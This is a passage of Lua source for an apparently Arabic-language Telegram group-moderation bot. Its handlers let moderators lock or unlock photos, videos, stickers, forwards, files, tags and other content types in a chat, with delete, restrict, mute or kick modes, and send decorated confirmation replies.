tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح الروابط ↝ ܰ ')  
end,nil)   
end
if text == 'قفل المعرفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل المعرفات ↝ ܰ ')  
end,nil)   
elseif text == 'قفل المعرفات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل المعرفات بالتقيد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل المعرفات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل المعرفات بالكتم ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل المعرفات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل المعرفات بالطرد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'فتح المعرفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:user:name"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح المعرفات ↝ ܰ ')  
end,nil)   
end
if text == 'تفعيل @all' and CoSu(msg) then   
if database:get(bot_id..'Cick:all'..msg.chat_id_) then
Text = ' ⌔︙تم تفعيل امر @all'
database:del(bot_id..'Cick:all'..msg.chat_id_)  
else
Text = ' ⌔︙بالتاكيد تم تفعيل امر @all'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل @all' and CoSu(msg) then  
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
database:set(bot_id..'Cick:all'..msg.chat_id_,true)  
Text = '\n ⌔︙تم تعطيل امر @all'
else
Text = '\n ⌔︙بالتاكيد تم تعطيل امر @all'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'قفل التاك' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل التاك ↝ ܰ ')  
end,nil)   
elseif text == 'قفل التاك بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل التاك بالتقيد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل التاك بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل التاك بالكتم ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل التاك بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل التاك بالطرد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'فتح التاك' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:hashtak"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح التاك ↝ ܰ ')  
end,nil)   
end
if text == 'قفل الشارحه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل الشارحه ↝ ܰ ')  
end,nil)   
elseif text == 'قفل الشارحه بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الشارحه بالتقييد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل الشارحه بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الشارحه بالكتم ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل الشارحه بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الشارحه بالطرد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'فتح الشارحه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Cmd"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح الشارحه ↝ ܰ ')  
end,nil)   
end
if text == 'قفل الصور'and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل الصور ↝ ܰ ')  
end,nil)   
elseif text == 'قفل الصور بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الصور بالتقييد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل الصور بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الصور بالكتم ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭ ')  
end,nil)   
elseif text == 'قفل الصور بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الصور بالطرد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'فتح الصور' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Photo"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح الصور ↝ ܰ ')  
end,nil)   
end
if text == 'قفل الفيديو' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل الفيد ↝ ܰ ')  
end,nil)   
elseif text == 'قفل الفيديو بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الفيديو بالتقييد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل الفيديو بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الفيديو بالكتم ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل الفيديو بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الفيديو بالطرد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'فتح الفيديو' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Video"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح الفيد ↝ ܰ ')  
end,nil)   
end
if text == 'قفل المتحركه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل المتحركات ↝ ܰ ')  
end,nil)   
elseif text == 'قفل المتحركه بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل المتحركه بالتقييد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل المتحركه بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل المتحركه بالكتم ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل المتحركه بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل المتحركه بالطرد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'فتح المتحركه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Animation"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح المتحركات ↝ ܰ ')  
end,nil)   
end
if text == 'قفل الالعاب' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل الالعاب ↝ ܰ ')  
end,nil)   
elseif text == 'قفل الالعاب بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الالعاب بالتقييد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل الالعاب بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الالعاب بالكتم ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل الالعاب بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:geam"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الالعاب بالطرد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'فتح الالعاب' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:geam"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح الالعاب ↝ ܰ ')  
end,nil)   
end
if text == 'قفل الاغاني' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل الاغاني ↝ ܰ ')  
end,nil)   
elseif text == 'قفل الاغاني بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الاغاني بالتقييد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل الاغاني بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الاغاني بالكتم ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل الاغاني بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الاغاني بالطرد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'فتح الاغاني' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Audio"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح الاغاني ↝ ܰ ')  
end,nil)   
end
if text == 'قفل الصوت' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ?? ܰ \n܁༯┆تم قفل الصوت ↝ ܰ ')  
end,nil)   
elseif text == 'قفل الصوت بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الصوت بالتقييد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل الصوت بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الصوت بالكتم ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل الصوت بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الصوت بالطرد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'فتح الصوت' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:vico"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح الصوت ↝ ܰ ')  
end,nil)   
end
if text == 'قفل الكيبورد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل الكيبورد ↝ ܰ ')  
end,nil)   
elseif text == 'قفل الكيبورد بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الكيبورد بالتقييد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل الكيبورد بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الكيبورد بالكتم ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل الكيبورد بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو بيك عمري ↝ ٭\n┤ تم قفل الكيبورد بالطرد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'فتح الكيبورد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Keyboard"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح الكيبورد ↝ ܰ ')  
end,nil)   
end
if text == 'قفل الملصقات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل الملصقات ↝ ܰ ')  
end,nil)   
elseif text == 'قفل الملصقات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو عمري ↝ ٭\n┤ تم قفل الملصقات بالتقييد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل الملصقات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو عمري ↝ ٭\n┤ تم قفل الملصقات بالكتم ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل الملصقات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو عمري ↝ ٭\n┤ تم قفل الملصقات بالطرد↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'فتح الملصقات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Sticker"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح الملصقات ↝ ܰ ')  
end,nil)   
end
if text == 'قفل التوجيه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل التوجيه ↝ ܰ ')  
end,nil)   
elseif text == 'قفل التوجيه بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو عمري ↝ ٭\n┤ تم قفل التوجيه بالتقييد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل التوجيه بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو عمري ↝ ٭\n┤ تم قفل التوجيه بالكتم ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل التوجيه بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو عمري ↝ ٭\n┤ تم قفل التوجيه ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'فتح التوجيه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:forward"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح التوجيه ↝ ܰ ')  
end,nil)   
end
if text == 'قفل الملفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل الملفات ↝ ܰ ')  
end,nil)   
elseif text == 'قفل الملفات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو عمري ↝ ٭\n┤ تم قفل الملفات بالتقييد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل الملفات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو  عمري ↝ ٭\n┤ تم قفل الملفات بالكتم ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'قفل الملفات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'┐ هلو عمري ↝ ٭\n┤ تم قفل الملفات بالطرد ↝ ٭\n┘ بواسطة ゠◞ *@'..data.username_..'* ◜  ✛ ٭')  
end,nil)   
elseif text == 'فتح الملفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Document"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم فتح الملفات ↝ ܰ')  
end,nil)   
end
if text == 'قفل السيلفي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'܁༯┆ههلو عمري ↝ ܰ \n܁༯┆تم قفل السيلفي ↝ ܰ')  
end,nil)   
elseif text == 'قفل السيلفي بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
